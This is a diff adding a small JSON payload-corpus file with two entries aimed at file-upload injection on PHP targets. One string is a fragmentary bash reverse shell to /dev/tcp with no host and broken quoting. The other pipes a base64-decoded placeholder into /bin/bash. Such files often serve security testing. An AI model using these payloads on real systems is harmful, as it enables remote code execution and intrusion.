@@ -1,0 +1,24 @@
+[
+  {
+    "payload_id": "OWP-61228",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "'bash -i \\x3e /dev/tcp/\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63803",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "'echo {b64_payload} | base64 -d | /bin/bash'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
